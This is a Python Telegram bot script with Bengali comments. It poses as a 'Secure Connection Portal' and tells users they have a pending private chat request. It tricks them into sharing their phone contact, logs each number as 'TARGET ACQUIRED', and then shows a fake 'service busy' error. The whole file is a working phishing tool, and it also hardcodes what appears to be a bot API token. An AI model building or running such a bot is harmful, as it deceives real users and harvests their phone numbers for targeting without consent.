import telebot
from telebot import types
import time

# আপনার টোকেন (নিশ্চিত হয়ে নিন এটি BotFather থেকে পাওয়া সঠিক টোকেন কি না)
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(1)
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Confirm Chat Request", request_contact=True)
    markup.add(button)
    
    welcome_text = (
        f"🛡️ **Secure Connection Portal**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Hello {message.from_user.first_name},\n\n"
        "You have a pending private chat request. To maintain privacy and security, "
        "please confirm your identity by clicking the button below.\n\n"
        "আপনার একটি চ্যাট রিকোয়েস্ট পেন্ডিং আছে। নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করে কনফার্ম করুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['contact'])
def get_contact(message):
    if message.contact is not None:
        phone = message.contact.phone_number
        print(f"\n🔥 TARGET ACQUIRED: {phone}\n")
        
        bot.send_message(message.chat.id, "✅ Identity Verified! Connecting to secure server...")
        time.sleep(2)
        bot.send_message(message.chat.id, "Error: Service busy. Please wait for the admin to initiate the chat.")

print("🚀 Bot is running on @Lnk_Connect_Bot...")
bot.polling()
